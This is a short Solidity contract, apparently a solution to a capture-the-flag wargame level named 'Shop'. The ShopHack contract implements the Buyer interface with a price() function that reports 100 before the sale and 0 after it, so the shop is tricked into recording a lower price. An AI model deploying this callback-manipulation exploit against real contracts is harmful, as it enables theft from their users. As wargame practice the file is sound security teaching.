// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import {Buyer} from "src/levels/Shop.sol";

interface IShop {
    function isSold() external view returns (bool);

    function buy() external;
}

contract ShopHack is Buyer {
    IShop private shop;

    constructor(address _shop) {
        shop = IShop(_shop);
    }

    function hack() external {
        shop.buy();
    }

    function price() external view override returns (uint) {
        return shop.isSold() ? 0 : 100;
    }
}
